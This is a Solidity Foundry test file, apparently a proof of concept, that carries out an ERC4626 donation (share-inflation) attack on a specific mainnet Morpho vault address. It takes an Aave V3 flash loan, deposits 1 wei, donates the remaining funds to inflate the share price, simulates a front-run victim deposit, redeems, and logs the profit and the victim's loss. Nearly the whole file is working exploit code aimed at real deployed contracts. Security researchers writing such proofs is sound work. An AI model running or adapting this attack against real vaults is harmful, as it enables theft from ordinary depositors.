// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Vault 0x7751 (Morpho v1, delayed ~9 days) - Flash Loan PoC

import "../basetest.sol";
import {IERC20} from "../interface.sol";

interface IERC4626Vault is IERC20 {
    function asset() external view returns (address);
    function totalAssets() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function mint(uint256 shares, address receiver) external returns (uint256 assets);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256 shares);
}

interface IAaveV3Pool {
    function flashLoanSimple(
        address receiverAddress, address asset, uint256 amount,
        bytes calldata params, uint16 referralCode
    ) external;
}

contract Vault_0x7751_DonationPoC is BaseTestWithBalanceLog {
    IERC4626Vault internal constant VAULT = IERC4626Vault(0x7751E2F4b8ae93EF6B79d86419d42FE3295A4559);
    IAaveV3Pool internal constant AAVE_POOL = IAaveV3Pool(0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2);
    uint256 internal constant FORK_BLOCK = 20_894_195;
    address internal constant VICTIM = address(0xbeef);
    IERC20 internal assetToken;
    uint8 internal assetDecimals;
    uint256 internal donationAmount;
    uint256 internal victimDeposit;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
        address a = VAULT.asset();
        assetToken = IERC20(a);
        fundingToken = a;
        assetDecimals = _getDecimals(a);
        donationAmount = 10_000 * (10 ** uint256(assetDecimals));
        victimDeposit = 100 * (10 ** uint256(assetDecimals));
        vm.label(address(VAULT), "Vault");
        vm.label(a, "Asset");
        vm.label(address(AAVE_POOL), "AaveV3Pool");
        vm.label(VICTIM, "Victim");
        emit log_string("=== Setup ===");
        emit log_named_uint("Fork Block", FORK_BLOCK);
        emit log_named_address("Vault", address(VAULT));
        emit log_named_address("Asset", a);
        emit log_named_decimal_uint("totalSupply", VAULT.totalSupply(), assetDecimals);
        emit log_named_decimal_uint("totalAssets", VAULT.totalAssets(), assetDecimals);
    }

    function _getDecimals(address t) internal returns (uint8) {
        (bool ok, bytes memory d) = t.staticcall(abi.encodeWithSignature("decimals()"));
        if (ok && d.length > 0) return abi.decode(d, (uint8));
        return 18;
    }

    // =========================================================================
    // Test 1: 诊断 - donation 敏感性检查 (deal 仅用于诊断)
    // =========================================================================
    function testDonationSensitivity() public {
        uint256 before_ = VAULT.totalAssets();
        deal(address(assetToken), address(this), donationAmount);
        assetToken.transfer(address(VAULT), donationAmount);
        uint256 after_ = VAULT.totalAssets();
        emit log_named_decimal_uint("totalAssets before", before_, assetDecimals);
        emit log_named_decimal_uint("totalAssets after", after_, assetDecimals);
        if (after_ > before_) emit log_string("[OK] BALANCE-BASED (donation sensitive)");
        else emit log_string("[INFO] INTERNAL ACCOUNTING (immune)");
    }

    // =========================================================================
    // Test 2: 完整攻击 - Flash Loan (攻击者零初始资金)
    // =========================================================================
    function testFullAttackFlow() public balanceLog {
        emit log_string("============================================================");
        emit log_string("=== ERC4626 Donation Attack via Flash Loan ===");
        emit log_string("============================================================");
        if (VAULT.totalSupply() > 0) { emit log_string("[SKIP] Vault has deposits"); return; }
        uint256 flashAmt = donationAmount + 1;
        emit log_named_decimal_uint("Flash Loan Amount", flashAmt, assetDecimals);
        AAVE_POOL.flashLoanSimple(address(this), address(assetToken), flashAmt, "", 0);
        uint256 profit = assetToken.balanceOf(address(this));
        emit log_string("=== RESULT ===");
        emit log_named_decimal_uint("Net Profit", profit, assetDecimals);
        if (profit > 0) emit log_string("[PASS] ATTACK PROFITABLE!");
        else emit log_string("[INFO] Not profitable or protected");
    }

    // =========================================================================
    // Aave V3 Flash Loan Callback
    // =========================================================================
    function executeOperation(
        address asset, uint256 amount, uint256 premium, address, bytes calldata
    ) external returns (bool) {
        require(msg.sender == address(AAVE_POOL), "not Aave");
        uint256 repay = amount + premium;
        emit log_named_decimal_uint("Borrowed", amount, assetDecimals);
        emit log_named_decimal_uint("Fee", premium, assetDecimals);

        // Step 1: deposit 1 wei -> 获取初始 share
        IERC20(asset).approve(address(VAULT), 1);
        uint256 atkShares = VAULT.deposit(1, address(this));
        emit log_named_decimal_uint("Attacker shares", atkShares, assetDecimals);

        // Step 2: 将剩余全部捐赠到 vault -> 膨胀 share price
        IERC20(asset).transfer(address(VAULT), amount - 1);
        emit log_named_decimal_uint("Share price/unit",
            VAULT.convertToAssets(10 ** uint256(assetDecimals)), assetDecimals);

        // Step 3: 受害者存款 (模拟被 front-run 的普通用户)
        deal(address(assetToken), VICTIM, victimDeposit);
        vm.startPrank(VICTIM);
        IERC20(asset).approve(address(VAULT), victimDeposit);
        try VAULT.deposit(victimDeposit, VICTIM) returns (uint256 vs) {
            vm.stopPrank();
            emit log_named_decimal_uint("Victim shares", vs, assetDecimals);
            if (vs == 0) emit log_string("[CRITICAL] Victim got 0 shares!");
            else {
                uint256 vv = VAULT.convertToAssets(vs);
                emit log_named_decimal_uint("Victim value", vv, assetDecimals);
                emit log_named_decimal_uint("Victim loss",
                    victimDeposit > vv ? victimDeposit - vv : 0, assetDecimals);
            }
        } catch {
            vm.stopPrank();
            emit log_string("[INFO] Victim deposit reverted (0-share protection)");
        }

        // Step 4: 攻击者赎回
        uint256 redeemed = VAULT.redeem(atkShares, address(this), address(this));
        emit log_named_decimal_uint("Attacker redeemed", redeemed, assetDecimals);

        // Step 5: 偿还 flash loan
        IERC20(asset).approve(address(AAVE_POOL), repay);
        return true;
    }
}
